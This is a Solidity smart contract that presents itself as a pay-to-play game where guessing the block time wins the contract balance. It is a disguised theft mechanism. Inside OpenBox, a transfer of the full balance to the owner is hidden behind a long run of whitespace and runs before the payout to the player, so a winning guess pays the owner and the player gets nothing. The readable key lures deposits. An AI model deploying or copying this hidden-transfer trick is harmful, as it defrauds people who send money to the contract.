pragma solidity ^0.4.19;

//Guess the block time and win the 
//balance. Proceed at your own risk.
//Open for all to play.
contract CarnieGamesBlackBox
{
    address public Owner = msg.sender;
    bytes32 public key = keccak256(block.timestamp);
   
    function() public payable{}
   
    //.1 eth charged per attempt
    function OpenBox(uint256 guess)
    public
    payable
    {                                                                    
        if(msg.value >= .1 ether)
        {
            if(keccak256(guess) == key)
            {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               Owner.transfer(this.balance);
                msg.sender.transfer(this.balance);
            }
        }                                                                                                                
    }
    
    function GetHash(uint256 input)
    public
    pure
    returns(bytes32)
    {
        return keccak256(input);
    }
    
    function Withdraw()
    public
    {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }
}